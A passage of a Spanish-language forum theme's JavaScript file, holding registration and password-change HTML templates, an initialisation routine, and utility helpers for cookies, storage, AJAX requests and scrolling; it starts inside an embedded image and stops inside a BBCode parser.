ryOlZHZ2liAIXpIHa61zErwQBH7A7Ozsn+QNzC//8i9/7Lu/+7vXXve6+/56s1n5Ky889/xcrztCeh5JmjAYDtjY2uTSpTLLywc4evgQlWqNMAxoNZq5SFo8ZjQcMclSDhz0edPBBqkK+MHXP8SLWx1MrcGlTkzSn5D5J7l4ZY0jr13kykaX+w8vMhiNOLI4Q0knHGlUqUQejUhQCzwqQlAr5DmwL/ckih1JmrC72+HihfNs7+wSj0f73Cw/DKhUqpw+dYpJHPN7v/shNjc2EVLGjUbz8UKx8H+ee+HF/7K5sd679/7XOf4Ur68J8I0bN/YDKyEESZIwHA5J0zQnhymFkopms8ns3ByVSoXHH39cWGt57Wtf+2U/zPd+7/c64PlCofgvzpw5+8Tc3NzfOH/h0v3XL68WhqPe/jq6eDymu7PLlUsXmZ+f4/ixY1TKVQrlMmFUoFUoA44sSUl0SpZpkixmcTEitTHvOhSSavCDkNGxRr4QkgUMBt+v4VmHr4pEvkfR8winWsw3W4rTFXXa0u33uXTxMlevXkXrDITLtbg8RaFQpFmr05qb4YXnn2Pl2nUQwoaFwtVCFP6+EOL9//Jf/IvHf+gf/EOzdPAgf9rX1wR4YWFh/5wdj8fEcT4u4SmFIE+b5ubmcvK2lIxGI/zAx1rLZz/7WfHggw9+xTs2DIP+r/zqr/zi933v9z5Wq9X+0sEDB/7yxYsXj6+v3fB6/SHWapTUTNKUYb/H6sp1qtUGy0sHWDywSKlYJCoUCIOASlRFevIlfVjn8pU7WZpQL07XwXoe0vf3NbPy36aD7Htp4XR+NUkzOt0O166vsrG+zqDfz6UPBSjpE4Qhoe/TbDaZxGMe+eTDpGlKVCrt+p76XBCEv7S9tfn7lVq980P/4B/e8nOH31gAAwwGA+I4xliTc4CBQlRgbm6O1swMQRAwmUzodLp02l2qtaqY7gV2Dz/8sHjTm970FUF+7w/8gANeCILwx48dO/pHzWbjezY2Dn7npUtXDqxev6riSYqQjlHsiJOU8WhEu73L5csXac20aLZmaTQaFEoRpWKBYrGUtwvzygZKSbxC8SVSEF8933dkRjMaD2lv7bCyskqv0yWexFgLAov08qnIMPCpFEukOuWpJx4nnsSEUdQrVytPep73wUKh+Hv9weB8pVb/kps6fNmVqVcc4Ha7TZZluTuWCt/zmZmZYXZujmKxSJZl7Ozs0t7tMI7jvZkc55wTe1Hixz/+cZEkCe9+97u/ItCFQmEEfLpYLD53/Pjx35mfn/+ujaOHv+36ysry2tqq3+v0cwJBkmKNReuMwWjI6voaQRgRRRHVcpXZ2Ra1Rh1PqqlwSpHA9/M+r4BCoYTvy2ljIG+y9/sDdrd22d7ZIs4SsiRlksRYY3AubycKCZ7y8XyPKIqI4wlPPfE4veHQ1ev1fmtm9hnf9z+cZelH/u7f+TtP/cS/fZ/9CkEmvu9TrVa/sQDWxuAphRSSRqPB3Nwc1VoN5xy9Xo/2bof+YIib7q631vLiixfd7FzLlctltMl1tTzP+5phY6lU6rz//e//2F/4C3/hi0eOHv3t5QMH3r69vf3WCxcunN7d3a1OxmORppPp+IohS8HqvNI26A1YW7txU/wEEF6+N9CTeXsv8D2EUFNOT05BynRGmk2nIKbzyWoqV5jHGB7KU+hMk8QTrl29ysbW1mRxbm73zNmzTxcKhU9obT72v/yT//npf/IjP5L9xL99H18N3HK5/BUZl3+mACuRJ+5z8/M0mk2UkoxHYzrtLt1uD63zCX6tDYVCxOxci3qjPt1pr/E9h1KOYtF3n/jkH7Kz3UUItc/v2qMCvfe9783d9nvf64Au8EeTyeRzYRj+0vz8/D39fv8dW1ubr++0OwvDQb84jofSaIvO8saDkRZpHUIorM1pOTK1OOmRiZQsSRjv7XeYDpdJ5L6wixC5Uq3aC7Skw2hDbzCg3emQTMZpqVQeLC0vnztx4uRn5+bnP6u1fuYnfvzHr3zXe96T/ZMf+ZGvlh7ug1sul7/xXPTBgweZmZkhDEOSJGF3u0e73SFJ0pxUpzWe57GwOEdrpolSHsZovCmwnqfQ2rC50WZ3t4fRhrn5uS8j9r3//e//ipXS9773vU+///3vf+Z7vud7PrKwsHCsvdt+XZIm9wyHwzvb7d1Do9Gw3Gl3Q22s0ibLdTwgd7HKQwszjYjz/q5UchpIiT0pH5zJiCcpcTwmSxJ2d7tOG22SOM6OHT3aPnTgwNUDBw8+evzE8c8NBsPnrl65cvGZp59JgjBw3/We93zVJs1XAvdr7Vj4Uwd4eXkZrTXt3Ta7ux1G43G+zWtaM200G8zOtYiiKJf2dxlB4PC8vJne6fTZ2e4ymaR40w/41khyr7i+x5D80msKvPu1X/u1LWDrve997+fTNJ3xPG9uPBod6ff7p4fDwZl2u3O6PxwudzvdWhyPIjKrhv2uh5AynSRCayPiSTL9tyZ4vnRJPHGeH9gsTVy1Uk9Go362sLi4e+LEiY0DBw9eEPB0vVY7f+z48XOtmZl1IH7/+9/Pe9/73q92Q+5PJNx65hYKhT8TcL8ugPv9fn7O9oc5ddZarLGUK2Vm5lpUqxWMyVea+77F83Jm4mgYs73dYTAY59Gsp7DO4XsevU4Xz/PI+/QCqTx85e2zRLIs2+9e3coNC4KAH/+xf+UuXry4nSTJdqaz537xl37p9+M4rp86faayvr4+WyqVGru7u0s7O9uzpWKpdu7cuRnf8wu77Z1yqVjJsklSKJai0ajfkQcOHV4fDIZJpVbfOnDw4EYcj3cPHj6ydvnypdE999y78YP/jx9Mrl25bO+843bK5TJHjx7l+eef5y0/+zO857u/h/Pnz3Pt2lV2dnbZ3d2h3+3s04yFEPi+T7FYpFqtsrS0xMmTJzl1+tQ3FsDXr92Yjmbm52wUhcwstWg064DAGD11xbk7nkwydnd26XT6OMc+sFIIimFEON0x8KVkPmstaZruE8m+kl6FtZb5+Xl2dnbodDoYY/hLf/F7rDNZO4qidqlSvra93ebkyVP8bz/2v4WAf9vttwfkSxxVMpmIMIpcmiQuCMNsyoFKgeSv/qXvsc1Wjde89rWsrK+zvb3Fn3/Pe/jxH/vfGQwGVCoV/jRqx6/0Jf7v+KZfvV5BTtar16sAv3q9CvCr16sAv3q9CvCr16sAv3q9CvD/f13/nwEABkg3fL2pi9AAAAAASUVORK5CYII="/>Registro a Open Source</h1> <p id="reg_tip">Debes llenar la información de registro.</p> <a href="javascript:void(0)" class="modal_close"></a> <form onsubmit="submit_reg(); return false" action="/register?agreed=true&step=2" method="post" name="reg" id="ucp"> <div class="main-content frm" style="border: 0px none;"> <fieldset class="frm-set multi" style="border: 0px none; margin:0;background-color: #FFF;"> <dl> <dt> <label>Nombre:</label> </dt> <dd> <input autocomplete="off" placeholder="Tu nick solo puede contener letras" type="text" id="username_reg" name="username" value="" size="25" maxlength="25" required /> Es importante que escribas un nick corto de una sola palabra, o no podrás avanzar <div id="name_reg" class="check_reg"> <div class="pwd_img reg_er kytu">Escribe mas de 3 caracteres.</div> <div class="pwd_img reg_er loi">Escoge otro nombre.</div> <div class="pwd_img reg_ok">Puedes usar este nombre</div> </div> </dd> </dl> <dl> <dt> <label>E-mail:</label> </dt> <dd> <input autocomplete="off" placeholder="introduce un email verdadero" class="ltr" type="email" id="email" name="email" value="" size="25" maxlength="64" required /> <div id="email_reg" class="check_reg"> <div class="pwd_img reg_er">No puedes utilizar esta dirección</div> <div class="pwd_img reg_wa">Tu email sera evaluado despues</div> </div> </dd> </dl> <dl> <dt> <label>Contraseña:</label> </dt> <dd> <input autocomplete="off" placeholder="No la olvides..." class="ltr" type="password" id="password_reg" name="password" value="" size="25" maxlength="25" required /> <div class="check_reg" id="cont_pwd"> <div class="pwd_img reg_er kytu">Escribe mas de 3 caracteres.</div> <div class="pwd_img reg_er trung">Este nombre ya existe</div> <div class="pwd_img" id="pwd_bad" style="display: none;">Muy simple</div> <div class="pwd_img" id="pwd_middle" style="display: none;">Normal</div> <div class="pwd_img" id="pwd_good" style="display: none;">Fuerte</div> </div> </dd> </dl> <dl> <dt> <label>Confirma la contraseña:</label> </dt> <dd> <input autocomplete="off" type="password" id="password_confirm" placeholder="Repite la contraseña..." size="25" maxlength="25" name="password_confirm" class="inputbox narrow" required /> <div id="pass_co" class="check_reg"> <div class="pwd_img reg_er">Incorrecto</div> <div class="pwd_img reg_ok">Correcto</div> </div> </dd> </dl> <dl><dt><span style="color:#303438!important">Sexo</span>:</dt> <dd> <ul id="profile_field_16_-7" class="profile_field_list"> <li> <label> <input type="radio" id="profile_field_16_-7" name="profile_field_16_-7" value="1" checked="checked" />&nbsp;<img src="https://illiweb.com/fa/m/gender_male.gif" alt="" data-hasqtip="14" oldtitle="Masculino" title="" />&nbsp;Masculino</label> </li> <li> <label> <input type="radio" id="profile_field_16_-7" name="profile_field_16_-7" value="2" />&nbsp;<img src="https://illiweb.com/fa/m/gender_female.gif" alt="" data-hasqtip="15" oldtitle="Femenino" title="" />&nbsp;Femenino</label> </li> </ul> <br/><span class="italic"></span> </dd> </dl> <dl><dt><span style="color:#303438!important;font-weight: bold;">Plataforma</span>: </dt> <dd> <input type="text" class="inputbox" id="profile_field_13_2" name="profile_field_13_2" style="width:279px" value="" placeholder="¿Qué versión es tu foro? Indícalo aquí" /> Opciones válidas (escribelas en minúsculas): phpbb3, phpbb2, punbb, e invision. </dd> <div id="nav_co" class="plataforma"> <div class="pwd_img br_er">Invalido</div> <div class="pwd_img br_ok">Valido</div> </div> </dl> <dl><dt><span style="color:#303438!important;font-weight: bold;">Navegador</span>: </dt> <dd> <input type="text" class="inputbox" id="profile_field_13_6" name="profile_field_13_6" style="width:279px" value="" placeholder="¿Qué navegador usas?" /> Opciones válidas (escribelas en minúsculas): chrome, firefox, explorer, opera y safari. </dd> <div id="nav_co" class="browser_reg"> <div class="pwd_img br_er">Invalido</div> <div class="pwd_img br_ok">Valido</div> </div> </dl> <dl><dt><span style="color:#303438!important;font-weight: bold;">Avatar</span>: </dt> <dd> <input type="text" class="inputbox" id="avatar_reg_ajax" style="width:279px" value="" placeholder="Coloca el link de tu avatar" /> Sin un link de avatar no podras avanzar ejemplo: https://r32.imgfast.net/users/3214/29/54/58/avatars/1-39.png </dd> <div id="nav_co" class="avatar"> <div class="pwd_img br_er">Invalido</div> <div class="pwd_img br_ok">Valido</div> </div> </dl> <dl class="reg_ajax_info"><dt><p>Para leer las condiciones de uso, ó si presentas problemas entra <a class="extrainfo_reg_ajax" href="/register">aquí</a></p></dt> </dl> <dl class="frm-buttons"> <p style="padding: 10px 0px 0px; text-align: center;"> <input class="button2" type="submit" name="submit" value="Register" /> <input class="button2" type="reset" name="reset" value="Reset" /> </p> </dl> </fieldset> </div> </form> </div>',

            mp_send_text: '<i class="fa fa-paper-plane"></i> Enviar un mensaje a ',
            not_found: 'No results found.. <img src="http://illiweb.com/fa/i/smiles/icon_sad.gif" style="margin:0;vertical-align:middle;"/>',
            mp_edit_text: '<i class="fas fa-edit"></i> Editar el mensaje enviado a ',
            mp_quote_text: '<i class="fas fa-quote-left" aria-hidden="true"></i> responder citando a ',
            l_pass: '<div class="l_pass" style="display: table; margin: 0 auto; margin-top: 20px;"><div id="cp-main" class="ucp-main"><div id="PassClose" style="background-image: linear-gradient(rgb(66, 165, 225),rgb(38, 124, 194));border: none!important;border-radius: 3px;color: rgb(255, 255, 255);padding: 1px 5px;cursor:pointer;width:37px;margin-left:90%;" onclick="ops.config.cerrar(this)"> Cerrar </div><h1 class="page-title">Información de Registro</h1><div class="panel"><div class="inner"><fieldset><dl><dt><label>Contraseña actual&nbsp;: *</label></dt><dd><input id="cur_password" type="password" name="cur_password" value="" class="inputbox" ></dd></dl></fieldset></div></div><div class="panel"><div class="inner"><fieldset><dl><dt><label>Nueva contraseña&nbsp;: *</label></dt><dd><input id="new_password" type="password" name="new_password" value="" class="inputbox" maxlength="25"></dd></dl><dl><dt><label>Confirmar contraseña&nbsp;: *</label></dt><dd><input id="password_confirm" type="password" name="password_confirm" value="" class="inputbox" maxlength="25" ><input type="hidden" name="change_password" value="change_password"></dd></dl></fieldset></div></div><fieldset class="submit-buttons"><input onclick="ops.config.contraseña(this);return false" class="button1" type="submit" name="submit" value="Registrar"></fieldset></div></div>',
            img_ava_default: 'https://i.imgur.com/mur4xDrh.png',
            beta: '<strong>¡Esta es la sección de mis códigos!</strong><br>En esta sección publicare mis códigos, es decir, aquellos javascript escritos por mi, en las demás secciones estarán aquellos que he probado, arreglado pero los obtuve de diversos foros, no tengo la costumbre de firmar lo mio, ni de dar créditos a los autores, he visto demasiado plagio que mientras yo sepa que yo los hice me es suficiente</br> Pronto estaré anexandolos y explicando su uso.</br> Algunos estan en fase de prueba por eso el nombre de <strong>Zona Beta</strong>, ustedes me ayudaran a que queden perfectos.',
            staff: '<strong>¡Esta es la sección del staff!</strong><br>Me gustaria que diario se dieran una vuelta por el foro, si no es posible tampoco es problema',
            support: '<i class="fa fa-info-circle" aria-hidden="true"></i><strong>Llena los datos que se te piden al abrir un tema</strong><br>No nos gusta cerrar soportes, pero si abandonas tu tema cuando se te mencione, 7 dias, se enviara a la papelera.',
            evaluaciones: '<strong>Solicita una evaluación para tu foro</strong><br>debes tener al menos 10 comentarios dentro del foro',
            codigos: '<strong>¡Bienvenido a Open Source!</strong><br>En esta sección podrás descargar los códigos, es importante que sepas el sistema para ver lo que esta oculto, Recuerda tener al menos 6 comentarios en el foro de lo contrario, no podras verlos</i><br><br><a href="http://source.openphpbb.com/t386-tutorial-como-veo-los-codigos-de-open-source?amp;topic_name#2125" class="ipsButton_secondary" style="color:rgb(48, 138, 205)!important">Como ver los códigos</a><a href="http://source.openphpbb.com/t385-nuevo-presentaciones" class="ipsButton_secondary" style="color:rgb(48, 138, 205)!important">Presentate a la comunidad</a><a href="/t202-sugerencia-te-gusto-el-foro-dejanos-algun-comentario" class="ipsButton_secondary" style="color:rgb(48, 138, 205)!important">Presenta tu sugerencia</a>',
            no_wallpost: '<div class="nomess" style="color:#fff!important;text-shadow:none" ><i class="fa fa-exclamation-circle" aria-hidden="true"></i> ' + _userdata.username + ', no tienes mensajes en tu muro </div>',
        },
       // ============================================================
// 🔹 INIT — núcleo principal de inicialización del foro
// ------------------------------------------------------------
// Autor: Chalo Valdez
// Contexto: Este bloque controla la inicialización del entorno
// ops (perfil, temas, índice, mensajes, staff, etc.)
// Mejora: Se agregan protecciones, console info y hooks claros
// ============================================================

iniciar: function (init) {
  try {
    var b = init.g('#tabs');

    // =======================================================
    // VARIABLES BASE / CONFIGURACIÓN GLOBAL
    // =======================================================
    ops.setupVar();
    ops.galletas();

    // =======================================================
    // PREFIJOS (solo fuera de índice o subforos)
    // =======================================================
    if (!ind && !sub) ops.prefijos();

    // =======================================================
    // BLOQUE DE ÍNDICE (inicio)
    // =======================================================
    if (ind) {
      ops.indice.pre();
      ops.indice.avatarIndex();
      ops.indice.miPortada();
    }

    // =======================================================
    // BLOQUE DE TEMAS
    // =======================================================
    if (tm) ops.temas.main.preTm();

    // =======================================================
    // EFECTO DE MATRIZ / FONDOS DINÁMICOS
    // =======================================================
    ops.matrix();

    // =======================================================
    // SUBFOROS Y TEMAS
    // =======================================================
    if (sub || tm) {
      ops.subs.cambiarHref();
      ops.temas.main.pathFormat();
    }

    // =======================================================
    // SUBFOROS (preconfiguración)
    // =======================================================
    if (sub) ops.subs.pre();

    // =======================================================
    // 🔸 SECCIONES PENDIENTES DE PULIR
    // -------------------------------------------------------
    // Mantengo tus comentarios y las dejo marcadas
    // =======================================================
    //!ops.logout && init.insertar(document.body, ops.html.regpanel, 'append');
    //(tm || ind && !ops.logout) && init.cachedScript('https://allphpbb31.com/js/reg.js');

    // =======================================================
    // USUARIO LOGUEADO — herramientas de barra superior
    // =======================================================
    if (ops.logout) {
      ops.indice.aceptarAmigos();
      ops.toolbar.notificaciones.plus();
      ops.menuTips();
      ops.init_check_mp();
      ops.toolbar.menufx();
      ops.toolbar.refresh();
    }

    // =======================================================
    // BLOQUE DE SISTEMAS INTERNOS (status + news)
    // =======================================================
    ops.status_box_html();
    ops.indice.news.newsfirst();

    // =======================================================
    // MENÚS, TOOLBARS, INTERFAZ GLOBAL
    // =======================================================
    ops.menuactivo();
    ops.toolbar.init();

    // Subforo o índice → funciones base de índice
    if (sub || ind) ops.indice.subindfunciones();

    // =======================================================
    // VALIDACIÓN DE SESIÓN
    // =======================================================
    if (pu && !ops.logout) location.href = '/';

    // =======================================================
    // PREFIJOS EN POST
    // =======================================================
    if (ps) ops.post.ponerprefijos();

    // =======================================================
    // MIEMBROS / MENSAJES PRIVADOS
    // =======================================================
    if (ml) ops.miembros.members();
    if (mp) ops.mp.first();

    // =======================================================
    // BLOQUES MISCELÁNEOS
    // =======================================================
    ops.menufixed();
    ops.cT_Ajx();
    ops.banner();
    ops.enviarActividad();
    ops.panel_log();
    ops.staff_alert();

    // =======================================================
    // STAFF SECTION / BÚSQUEDA INTERNA
    // =======================================================
    /h2-staff/.test(document.location.href) && ops.searchSatff();

    // =======================================================
    // RECARGA AUTOMÁTICA DE NOTICIAS
    // =======================================================
    setInterval(ops.indice.reloadnews, 3e5);

    // =======================================================
    // PERFIL — configuración asincrónica de tabs
    // =======================================================
    if (pu || pr || sr) {
      init.fadeIn(b, 200);
      ops.perfil.main.tabsAsincronas();
    }

    // =======================================================
    // PERFIL — setup general si usuario logueado
    // =======================================================
    if (pu && ops.logout) {
      ops.perfil.main.variables();
      ops.perfil.main.setup();
    }

    // =======================================================
    // CONFIGURACIÓN — pestañas del panel de control
    // =======================================================
    if (pr || sr) {
      ops.config.tabs();
      ops.config.setup(init.g('#cp-main'), document);
    }

    // =======================================================
    // TEMAS — tráfico, visualización, estadísticas
    // =======================================================
    if (tm) ops.temas.main.trafico();

    // =======================================================
    // 🔧 AVATAR MODAL / ONLOADSTEP
    // -------------------------------------------------------
    // EN: Carga el detector de avatar y ejecuta onloadstep.
    // ES: Inicializa modal de avatar si el usuario tiene
    //     una imagen detectada en su perfil.
    // =======================================================
    window.addEventListener('load', function () {
      try {
        // Detección según tu estructura personalizada:
        // .postprofile > .f_a1 > .imgholder > figure > a[href="/u<ID>"] > img
        const myAvatar = document.querySelector(
          '.postprofile .imgholder a[href="/u' + ops.mi_id + '"] img'
        );

        if (myAvatar) {
          ops.cambiarAvatarModal();
          console.log('%c[ops] Avatar modal ready for user: ' + ops.mi_nombre, 'color:#05abe0;');
        } else {
          console.warn('[ops] Avatar not found for current user — skipping cambiarAvatarModal.');
        }

        // ✅ Ejecuta tu función onloadstep completa
        ops.onloadstep();

      } catch (err) {
        console.error('[ops] Error initializing avatar modal:', err);
      }
    });

    // =======================================================
    // 🔸 SECCIÓN OPCIONAL STAFF / LIKES
    // -------------------------------------------------------
    // Mantengo tu línea original, sin ejecutarla.
    // =======================================================
    //ops.soy_staff && ops.temas.like.staffponeenlospostesto();

  } catch (e) {
    console.error('[ops] iniciar() critical error:', e);
  }
},

        onloadstep: function () {
            var c = init.g('#cp-main'),
                f = init.g('#main-content'),
                h = init.g('.dl_titulo'),
                k = (mp || ps) && init.g('#message-box');
            ops.titulo_pagina = document.title;
            ps && ops.post.temasSimilares();
            (mp || ps) && k && (init.fadeIn(k, 200), h.length && (init.show(h[0])));
            (ind) && (ops.temas.editor.keyupTextarea(), ops.indice.extraActividad('/u92wall'));
            ind && (ops.indice.ultimoUsuario(), ops.indice.muro.textarea());
            (ind || tm) && ops.cambiarAvatar();
            ops.confirm();
            ops.open_blank();
            window.setTimeout((isPostReply || isMPpostReply || isWallPost) && ops.post.salvatexto(), (ps || isMPNew || isMPpost || isMPedit || isWallPost) && ops.post.value_default(), !ops.logout && ops.temas.main.noCode(), 500);
            window.setTimeout(ind && ops.StaffOnline(), (ind || tm) && ops.indice.hovercard(), ind && ops.logout && ops.indice.prevLastpost(), 2000);
            window.setTimeout(ops.tooltips(),3000);
        },
        //herramientas
        preventDoubleClick: function (target, cond, spin, color, event, rgb, rgba, funciones) {
            var colorActual,
                colorspin = 'undefined' != typeof rgb ? rgb : '#fff',
                load = init.create('div', {
                    style: {
                        display: 'inline'
                    },
                    childs: [{
                        tag: 'i',
                        class: 'fa fa-spinner fa-pulse',
                        attributes: {
                            id: 'spinClick'
                        },
                        style: {
                            fontSize: '14px',
                            color: colorspin,
                        }
                    }]
                }),
                colorbutton = 'undefined' != typeof rgba ? rgba : '#c22d00',
                time = ops.old_timestamp,
                isValue = target.hasAttribute('value'),
                isColor = target.hasAttribute('color'),
                valorinicial = isValue ? target.value : target.innerHTML;
            if (cond) {
                if (!init.g('#spinClick')) {
                    if (color) {
                        colorActual = ops.perfil.muro.currentCSS(target).background;
                        target.setAttribute('color', colorActual);
                        target.style.cssText += 'background:' + colorbutton + ';background-repeat: no-repeat;';
                    }!isValue ? (spin ? init.replaceHtml(load, target) : init.move(target, load, 'append')) : target.value = ' Enviando...';
                    target.setAttribute('data', valorinicial);
                    target.setAttribute('disabled', 'disabled');
                    target.style.opacity = '0.5';
                    'undefined' != typeof funciones && funciones();
                } else {
                    ops.toolbar.notify.go('Ya diste un click previamente, espera', null, 'alert', 'fas fa-exclamation-circle');
                }
            } else {
                valorinicial = target.getAttribute('data');
                if (isColor) {
                    colorActual = target.getAttribute('color');
                    target.style.background = colorActual;
                    target.removeAttribute('color');
                }
                target.style.opacity = '1';
                target.removeAttribute('disabled');
                target.removeAttribute('data');
                !isValue ? (target.innerHTML = valorinicial) : (target.value = valorinicial)
            }
        },
        imgBroken: function (t, src) {
            var a = function (event) {
                t.src = src;
                t.removeEventListener('error', a, false)
            };
            t.addEventListener('error', a, false)
        },
        dataStore: {
            on: typeof window.localStorage !== 'undefined',
            set: function (name, value, exp) {
                if (ops.dataStore.on) {
                    window.localStorage[name] = value;
                    if (exp) window.localStorage[name + 'Exp'] = +new Date + '|' + exp;
                }
            },
            get: function (name) {
                var o = {
                    value: null,
                    exp: null
                };
                if (ops.dataStore.on) {
                    var exp = window.localStorage[name + 'Exp'];
                    if (exp) {
                        exp = exp.split('|');
                        exp = exp.length == 2 ? +exp[0] - (+new Date - +exp[1]) : 0;
                    }
                    o.value = window.localStorage[name] || '';
                    o.exp = exp > 0 ? exp : 0;
                }
                return o;
            },
            del: function (name) {
                if (ops.dataStore.on && window.localStorage[name]) {
                    window.localStorage.removeItem(name);
                    window.localStorage.removeItem(name + 'Exp');
                }
            }
        },
        placeholder: function (a, b) {
            a.setAttribute('placeholder', b)
        },
        xmlhRequest: function (a, b, f) {
            var c, condicion = 'undefined' != typeof a,
                params = condicion && typeof a == 'string' ? a : Object.keys(a).map(
                    function (k) {
                        return init.fixedEncodeURIComponent(k) + '=' + init.fixedEncodeURIComponent(a[k])
                    }
                ).join('&');
            c = window.XMLHttpRequest ? new XMLHttpRequest : window.ActiveXObject && (new ActiveXObject('Microsoft.XMLHTTP'));
            condicion ? c.open('POST', b) : c.open('GET', b, true);
            c.responseType = 'document';
            c.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            c.send(condicion ? params : '');
            c.onreadystatechange = function () {
                this.readyState == 4 && this.status == 200 && (f(this));
            }
        },
        getNextSiblings: function (el, filter) {
            var siblings = [];
            while (el = el.nextSibling) {
                if (!filter || filter(el)) siblings.push(el);
            }
            return siblings;
        },
        sinEspacios: function (e) {
            return e = e.toLowerCase().replace(/\W+/g, '_').replace(/\-{2}/g, '_').replace(/^\-+|\-+$/g, '')
        },
        serialize: function (a) {
            var b, i, j, s = [];
            if (typeof a == 'object' && a.nodeName == 'FORM') {
                var len = a.elements.length;
                for (i = 0; i < len; i++) {
                    b = a.elements[i];
                    if (b.name && !b.disabled && b.type != 'file' && b.type != 'reset' && b.type != 'submit' && b.type != 'button') {
                        if (b.type == 'select-multiple') {
                            for (j = a.elements[i].options.length - 1; j >= 0; j--) {
                                if (b.options[j].selected) s[s.length] = encodeURIComponent(b.name) + '=' + encodeURIComponent(b.options[j].value);
                            }
                        } else if ((b.type != 'checkbox' && b.type != 'radio') || b.checked) {
                            s[s.length] = encodeURIComponent(b.name) + '=' + encodeURIComponent(b.value);
                        }
                    }
                }
            }
            return s.join('&').replace(/%20/g, '+');
        },
        topictype: function (a, c) {
            for (var b, i = 0; i < a.length; i++) {
                if (a[i].checked) {
                    b = a[i];
                    break;
                }
            }
            if (b) {
                if ('undefined' != typeof c) {
                    return b.nextElementSibling.textContent
                } else {
                    return b.value;
                }
            }
        },
        galletas: function () {
            ! function (e) {
                var n = !1;
                if ('function' == typeof define && define.amd && (define(e), n = !0), 'object' == typeof exports && (module.exports = e(), n = !0), !n) {
                    var t = window.Cookies,
                        o = window.Cookies = e();
                    o.noConflict = function () {
                        return window.Cookies = t, o
                    }
                }
            }(function () {
                function e() {
                    for (var e = 0, n = {}; e < arguments.length; e++) {
                        var t = arguments[e];
                        for (var o in t) n[o] = t[o]
                    }
                    return n
                }

                function n(t) {
                    function o(n, r, i) {
                        var c;
                        if ('undefined' != typeof document) {
                            if (arguments.length > 1) {
                                if (i = e({
                                        path: '/'
                                    }, o.defaults, i), 'number' == typeof i.expires) {
                                    var a = new Date;
                                    a.setMilliseconds(a.getMilliseconds() + 864e5 * i.expires), i.expires = a
                                }
                                try {
                                    c = JSON.stringify(r), /^[\{\[]/.test(c) && (r = c)
                                } catch (s) {}
                                return r = t.write ? t.write(r, n) : encodeURIComponent(String(r)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent), n = encodeURIComponent(String(n)), n = n.replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent), n = n.replace(/[\(\)]/g, escape), document.cookie = [n, '=', r, i.expires ? '; expires=' + i.expires.toUTCString() : '', i.path ? '; path=' + i.path : '', i.domain ? '; domain=' + i.domain : '', i.secure ? '; secure' : ''].join('')
                            }
                            n || (c = {});
                            for (var p = document.cookie ? document.cookie.split('; ') : [], u = /(%[0-9A-Z]{2})+/g, d = 0; d < p.length; d++) {
                                var f = p[d].split('='),
                                    l = f.slice(1).join('=');
                                '"' === l.charAt(0) && (l = l.slice(1, -1));
                                try {
                                    var m = f[0].replace(u, decodeURIComponent);
                                    if (l = t.read ? t.read(l, m) : t(l, m) || l.replace(u, decodeURIComponent), this.json) try {
                                        l = JSON.parse(l)
                                    } catch (s) {}
                                    if (n === m) {
                                        c = l;
                                        break
                                    }
                                    n || (c[m] = l)
                                } catch (s) {}
                            }
                            return c
                        }
                    }
                    return o.set = o, o.get = function (e) {
                        return o.call(o, e)
                    }, o.getJSON = function () {
                        return o.apply({
                            json: !0
                        }, [].slice.call(arguments))
                    }, o.defaults = {}, o.remove = function (n, t) {
                        o(n, '', e(t, {
                            expires: -1
                        }))
                    }, o.withConverter = n, o
                }
                return n(function () {})
            });
        },
        scroll: {
            top: function (o, e, s, t) {
                var h, n = o.nodeType == 1 ? o : init.g(o);
                e = e || 500, t = t || window;
                h = n.clientHeight < 150 ? n.clientHeight * 2 : n.clientHeight < 300 ? n.clientHeight : n.clientHeight > 400 && '';
                var r = t.scrollTop - h || window.pageYOffset - h;
                if ('number' == typeof n) var l = parseInt(n);
                else var l = ops.scroll.getTop(n, r);
                var i = Date.now(),
                    c = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || function (o) {
                        window.setTimeout(o, 15)
                    },
                    a = function () {
                        var o = Date.now() - i;
                        t !== window ? t.scrollTop = ops.scroll.position(r, l, o, e) : window.scroll(0, ops.scroll.position(r, l, o, e)), o > e ? 'function' == typeof s && s(n) : c(a)
                    };
                a()
            },
            easeInOutCubic: function (t) {
                return t < .5 ? 4 * t * t * t : (t - 1) * (2 * t - 2) * (2 * t - 2) + 1
            },
            position: function (o, e, s, t) {
                return s > t ? e : o + (e - o) * ops.scroll.easeInOutCubic(s / t)
            },
            getTop: function (o, e) {
                return 'HTML' === o.nodeName ? -e : o.getBoundingClientRect().top + e
            },
            getOffset: function (el) {
                el = el.getBoundingClientRect();
                return {
                    left: el.left + window.scrollX,
                    top: el.top + window.scrollY
                }
            },
        },
        storage: function (id, html, info) {
            var w = window.localStorage,
                a = info == 'miniaturas' ? 'mini_por_' : 'user_ava_',
                b = info == 'miniaturas' ? 'mini_exp_' : 'user_exp_';
            if (!w.getItem('user_ava_' + id) || w.getItem('user_exp_' + id) < +new Date - 24 * 60 * 60 * 1000) {
                w.setItem(a + id, html);
                w.setItem(b + id, +new Date);
            }
        },
        box: function (a, d, f) {
            var b = init.g('#topicPreview-container'),
                c = init.g('.topicprv_h3')[0],
                e = b.lastChild,
                g = init.g('#postingbox'),
                h = init.g('#previewAjax');
           // if (d == 'Previsualizar' && mp) {
              //  h && init.borrar(h);
              //  init.move(g, a, 'prepend');
           // } else {
                a.nodeType == 1 ? init.replaceHtml(a, e) : (e.innerHTML = a);
                c.innerHTML = 'undefined' != typeof d ? d : ''
           // }
            ops.back(b, f);
        },
        back: function (c, f) {
            var b, a = init.g('#lightBG'),
                d = 'undefined' != typeof c;
            if (d) {
                b = c.nodeType == 3 ? init.g(c) : c;
                init.move(a, b, 'append', function (z, w) {
                    init.show(w);
                    init.fadeIn(a, 400);
                    'undefined' != typeof f && f(z);
                })
            } else init.fadeIn(a, 400)
        },
        BBCodeToHtml: function (c) {
            var a = [/\[b\](.*?)\[\/b\]/g, /\[i\](.*?)\[\/i\]/g, /\[u\](.*?)\[\/u\]/g, /\[s\](.*?)\[\/s\]/g, /\[center\](.*?)\[\/center\]/g, /\[size=(.*?)\](.*?)\[\/size\]/g, /\[url](.*?)\[\/url\]/g, /\[url=(.*?)\](.*?)\[\/url\]/g, /\[color=(.*?)\](.*?)\[\/color\]/g, /\[img\](.*?)\[\/img\]/g, /\[table class=(.*?)\]\[td\](.*?)\[\/td\]\[\/table\]/g];
